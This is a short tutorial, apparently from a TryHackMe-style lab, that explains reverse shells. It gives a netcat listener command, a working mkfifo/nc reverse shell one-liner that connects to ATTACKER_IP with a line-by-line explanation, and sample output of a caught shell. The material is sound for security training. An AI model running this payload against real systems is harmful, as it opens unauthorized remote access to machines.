# Reverse Shell Overview

A reverse shell connects back to the attacker’s machine, allowing access to the target system while bypassing firewalls and security measures.

## Setting Up a Netcat Listener

**Command:** `nc -lvnp 443`

- `-l`: Listen for incoming connections.
- `-v`: Enable verbose mode.
- `-n`: Prevent DNS resolution, using only IP addresses.
- `-p`: Specify the port (e.g., 443) for listening.

## Gaining Reverse Shell Access

After setting the listener, the attacker executes a reverse shell payload on the compromised system. One example is the pipe reverse shell payload:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

### Payload Explanation:

- `rm -f /tmp/f`: Removes any existing named pipe at `/tmp/f`.
- `mkfifo /tmp/f`: Creates a new named pipe for communication.
- `cat /tmp/f`: Waits for input from the named pipe.
- `| sh -i 2>&1`: Pipes the input to an interactive shell, redirecting errors to standard output.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Sends the shell's output to the attacker's machine.
- `>/tmp/f`: Sends back command outputs to the named pipe for two-way communication.

## Attacker Receives the Shell

When the payload is executed, the attacker’s terminal shows a successful connection, allowing them to execute commands on the target system as if they were using a regular terminal.

### Example Output:

```ruby
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:~$
```